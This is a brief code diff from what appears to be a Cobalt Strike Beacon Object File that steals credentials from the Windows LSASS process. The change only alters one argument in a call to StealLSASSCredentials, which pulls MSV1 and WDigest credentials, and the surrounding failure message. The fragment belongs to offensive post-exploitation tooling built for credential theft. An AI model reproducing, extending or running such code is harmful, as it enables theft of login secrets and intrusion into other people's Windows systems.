@@ -156,7 +156,7 @@ int go(char *args, int argLen)
     }
 
 
-    if (!StealLSASSCredentials(hFile, WindowsVersion, RetrieveMSV1Credentials, RetrieveWDigestCredentials, provider))
+    if (!StealLSASSCredentials(hFile, NT_BUILD_NUMBER, RetrieveMSV1Credentials, RetrieveWDigestCredentials, provider))
     {
         BeaconFormatPrintf(&outputbuffer, "[!] Failed to retrieve LSASS credentials!\n\n");
     }
